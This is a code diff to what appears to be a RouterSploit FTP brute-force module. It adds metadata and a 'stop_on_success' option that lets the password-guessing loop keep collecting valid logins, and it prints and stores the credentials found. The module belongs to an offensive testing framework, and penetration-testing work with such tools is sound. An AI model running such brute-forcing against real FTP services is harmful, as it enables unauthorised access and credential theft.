@@ -23,9 +23,17 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'FTP Bruteforce',
-        'author': [
-            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
-        ]
+        'description': 'Module performs bruteforce attack against FTP service.'
+                       'If valid credentials are found, they are displayed to the user.',
+        'authors': [
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            '',
+        ],
+        'devices': [
+            'Multi',
+        ],
     }
 
     target = exploits.Option('', 'Target IP address or file with target:port (file://)')
@@ -35,6 +43,7 @@ class Exploit(exploits.Exploit):
     usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
     passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
+    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
 
     credentials = []
 
@@ -107,7 +116,9 @@ class Exploit(exploits.Exploit):
                 try:
                     ftp.login(user, password)
 
-                    running.clear()
+                    if boolify(self.stop_on_success):
+                        running.clear()
+
                     print_success("Target: {}:{} {}: Authentication succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                     self.credentials.append((self.target, self.port, user, password))
                 except:
